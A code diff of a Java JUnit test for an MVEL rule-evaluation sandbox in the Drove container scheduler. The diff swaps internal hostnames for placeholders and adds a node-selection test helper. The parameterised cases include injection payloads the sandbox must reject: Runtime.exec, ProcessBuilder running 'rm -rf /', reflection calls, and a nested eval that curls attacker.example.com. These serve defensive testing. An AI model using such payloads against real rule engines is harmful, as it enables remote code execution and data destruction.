@@ -16,16 +16,15 @@
 
 package com.phonepe.drove.controller.rule.mvel;
 
-import com.phonepe.drove.controller.rule.TestDataNode;
-import com.phonepe.drove.models.operation.rule.RuleCallStatus;
-import lombok.val;
-import org.junit.jupiter.api.Test;
-import org.junit.jupiter.params.ParameterizedTest;
-import org.junit.jupiter.params.provider.Arguments;
-import org.junit.jupiter.params.provider.MethodSource;
+import static org.junit.jupiter.api.Assertions.assertEquals;
+import static org.junit.jupiter.api.Assertions.assertFalse;
+import static org.junit.jupiter.api.Assertions.assertTrue;
 
 import java.util.ArrayList;
+import java.util.Collections;
 import java.util.List;
+import java.util.Map;
+import java.util.Set;
 import java.util.concurrent.Callable;
 import java.util.concurrent.ExecutionException;
 import java.util.concurrent.ExecutorService;
@@ -34,7 +33,23 @@ import java.util.concurrent.Future;
 import java.util.concurrent.TimeUnit;
 import java.util.stream.Stream;
 
-import static org.junit.jupiter.api.Assertions.*;
+import com.phonepe.drove.controller.ControllerTestUtils;
+import com.phonepe.drove.controller.rule.TestDataNode;
+import com.phonepe.drove.models.info.nodedata.ExecutorState;
+import com.phonepe.drove.models.info.nodedata.NodeTransportType;
+import com.phonepe.drove.models.info.resources.NodeSelectionContext;
+import com.phonepe.drove.models.info.resources.allocation.AllocatedExecutorNode;
+import com.phonepe.drove.models.info.resources.allocation.CPUAllocation;
+import com.phonepe.drove.models.info.resources.allocation.GPUAllocation;
+import com.phonepe.drove.models.info.resources.allocation.MemoryAllocation;
+import com.phonepe.drove.models.operation.rule.RuleCallStatus;
+
+import org.junit.jupiter.api.Test;
+import org.junit.jupiter.params.ParameterizedTest;
+import org.junit.jupiter.params.provider.Arguments;
+import org.junit.jupiter.params.provider.MethodSource;
+
+import lombok.val;
 
 class MvelRuleStrategyTest {
 
@@ -62,17 +77,19 @@ class MvelRuleStrategyTest {
     void concurrentEvaluationIsThreadSafeAndCorrect() throws InterruptedException, ExecutionException {
         val strategy = new MvelRuleStrategy(50, new SafeMvel(List.of()));
 
-        // The four real MVEL rules from the incident report
+        val matchingExecutorId = "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee";
+        val matchingHostname   = "executor-01.example.internal";
+        val nonMatchingId      = "11111111-2222-3333-4444-555555555555";
+        val nonMatchingHost    = "executor-99.example.internal";
+
         val rules = List.of(
-                "executorNodeId=='0cfcc837-1ecf-3f82-bcf1-23b53fb08959'",
-                "executorNodeId=='stg-droveexec007.phonepe.nb6'",
-                "allocatedExecutorNodeMetadata.hostname=='stg-droveexec007.phonepe.nb6'",
-                "executorNodeId==\"stg-droveexec007.phonepe.nb6\""
+                "allocation.node.executorId=='" + matchingExecutorId + "'",
+                "allocation.node.hostname=='" + matchingHostname + "'",
+                "allocation.node.executorId==\"" + matchingExecutorId + "\""
         );
 
-        // A lightweight stand-in for SchedulingInfo with the fields the rules reference
-        val matchingNode   = new SyntheticSchedulingInfo("stg-droveexec007.phonepe.nb6");
-        val nonMatchingNode = new SyntheticSchedulingInfo("stg-droveexec999.phonepe.nb6");
+        val matchingContext    = nodeSelectionContext(matchingExecutorId, matchingHostname);
+        val nonMatchingContext = nodeSelectionContext(nonMatchingId, nonMatchingHost);
 
         val threadCount = 32;
         ExecutorService pool = Executors.newFixedThreadPool(threadCount);
@@ -81,11 +98,11 @@ class MvelRuleStrategyTest {
         for (int t = 0; t < threadCount; t++) {
             tasks.add(() -> {
                 for (val rule : rules) {
-                    val matchResult = strategy.evaluate(rule, matchingNode);
+                    val matchResult = strategy.evaluate(rule, matchingContext);
                     assertEquals(RuleCallStatus.SUCCESS, matchResult.getStatus(),
                                  "Rule evaluation must succeed: " + rule);
 
-                    val noMatchResult = strategy.evaluate(rule, nonMatchingNode);
+                    val noMatchResult = strategy.evaluate(rule, nonMatchingContext);
                     assertEquals(RuleCallStatus.SUCCESS, noMatchResult.getStatus(),
                                  "Rule evaluation must succeed for non-matching node: " + rule);
                 }
@@ -121,9 +138,8 @@ class MvelRuleStrategyTest {
                 Arguments.of(RuleCallStatus.SUCCESS, "name == 'Thread Pool Manager'"),
                 Arguments.of(RuleCallStatus.SUCCESS, "desc == 'Class A student'"),
                 Arguments.of(RuleCallStatus.SUCCESS, "x == 'call getClass for info'"),
-                Arguments.of(RuleCallStatus.SUCCESS, "tag == 'invoke handler'"),
-                Arguments.of(RuleCallStatus.SUCCESS, "executorNodeId=='stg-droveexec007.phonepe.nb6'"),
-                Arguments.of(RuleCallStatus.SUCCESS, "allocatedExecutorNodeMetadata.hostname=='node1'"),
+                Arguments.of(RuleCallStatus.SUCCESS, "allocation.node.executorId=='executor-01.example.internal'"),
+                Arguments.of(RuleCallStatus.SUCCESS, "allocation.node.hostname=='node1'"),
                 Arguments.of(RuleCallStatus.FAILURE, "aa bb"),
                 Arguments.of(RuleCallStatus.FAILURE, "Runtime.getRuntime().exec('touch /tmp/test')"),
                 Arguments.of(RuleCallStatus.FAILURE, "new ProcessBuilder('rm', '-rf', '/').start()"),
@@ -145,7 +161,7 @@ class MvelRuleStrategyTest {
                 Arguments.of(RuleCallStatus.FAILURE, "'a'.getClass().newInstance()"),
                 Arguments.of(RuleCallStatus.FAILURE, "'a'.getClass().getField('value')"),
                 Arguments.of(RuleCallStatus.FAILURE, "'a'.getClass().getDeclaredField('value')"),
-                Arguments.of(RuleCallStatus.FAILURE, "org.mvel2.MVEL.eval('Runtime.getRuntime().exec(\\\"curl http://automaton.nixy.stg-drove.phonepe.nb6/testdrovepoc\\\")');true"),
+                Arguments.of(RuleCallStatus.FAILURE, "org.mvel2.MVEL.eval('Runtime.getRuntime().exec(\\\"curl http://attacker.example.com/test\\\")');true"),
 
                 // ---- Thread/System etc ----
                 Arguments.of(RuleCallStatus.FAILURE, "Thread.currentThread()"),
@@ -160,19 +176,32 @@ class MvelRuleStrategyTest {
         );
     }
 
-
-    @SuppressWarnings("unused")
-    public static class SyntheticSchedulingInfo {
-        public String executorNodeId;
-        public java.util.Map<String, String> allocatedExecutorNodeMetadata;
-
-        public SyntheticSchedulingInfo() {}
-
-        SyntheticSchedulingInfo(String hostname) {
-            this.executorNodeId = hostname;
-            this.allocatedExecutorNodeMetadata = java.util.Map.of("hostname", hostname);
-        }
+    private static NodeSelectionContext nodeSelectionContext(String executorId, String hostname) {
+        val node = new AllocatedExecutorNode(
+                executorId,
+                hostname,
+                7000,
+                NodeTransportType.HTTP,
+                new CPUAllocation(Collections.singletonMap(0, Collections.singleton(2))),
+                new MemoryAllocation(Collections.singletonMap(0, 512L)),
+                new GPUAllocation(Set.of(), null),
+                Set.of(),
+                Map.of(),
+                ExecutorState.ACTIVE);
+        return NodeSelectionContext.builder()
+                .session(NodeSelectionContext.SchedulingSession.builder()
+                                 .sessionId("test-session")
+                                 .build())
+                .environment(NodeSelectionContext.SchedulingEnvironment.builder()
+                                     .liveExecutors(Map.of())
+                                     .variables(Map.of())
+                                     .build())
+                .allocation(NodeSelectionContext.NodeAllocation.builder()
+                                    .spec(ControllerTestUtils.appSpec())
+                                    .instanceId("test-instance")
+                                    .node(node)
+                                    .build())
+                .build();
     }
-
 
 }
